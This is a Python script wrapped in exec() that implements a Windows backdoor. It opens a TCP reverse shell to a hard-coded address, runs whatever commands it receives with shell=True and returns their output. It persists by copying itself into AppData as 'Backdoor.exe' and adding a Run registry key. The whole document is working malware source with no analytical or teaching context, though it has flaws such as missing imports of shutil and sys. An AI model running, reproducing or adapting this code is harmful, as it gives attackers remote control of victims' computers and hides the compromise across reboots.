exec("""\n#!/usr/share/python3\n# SOCKET\n#      CONNECT\n\nfrom distutils.cmd import Command\nimport socket\nimport subprocess\nimport json\nimport os\n\ndef reliable_send(data):\n	json_data = json.dumps(data).encode()\n	sock.send(json_data)\n\ndef reliable_recv():\n	json_data = ""\n	while True:\n		try:\n			json_data = json_data + sock.recv(1024).decode()\n			return json.loads(json_data)\n		except ValueError:\n			continue\n\ndef shell():\n	while True:\n		command = reliable_recv()\n		if command == "q":\n			break\n		elif command[:2] == "cd" and len(command) > 1:\n			try:\n				os.chdir(command[3:])\n			except:\n				continue\n		elif command == "id":\n			try:\n				user = os.getlogin()\n			except:\n				continue\n		else:\n			try:\n				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n				result = proc.stdout.read() + proc.stderr.read()\n				reliable_send(result.decode())\n\n			except:\n				reliable_send("[!!] Can't Execute That Command")\n\nlocation = os.environ["appdata"] + "\\\\Backdoor.exe"\nif not os.path.exists(location):\n	shutil.copyfile(sys.executable, location)\n	subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)\nsock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #usage for ipv4 add & tcp connection to server\nsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\nsock.connect(("10.0.0.34",54321)) #ip of host + desired port\nshell()\nsock.close()\n""")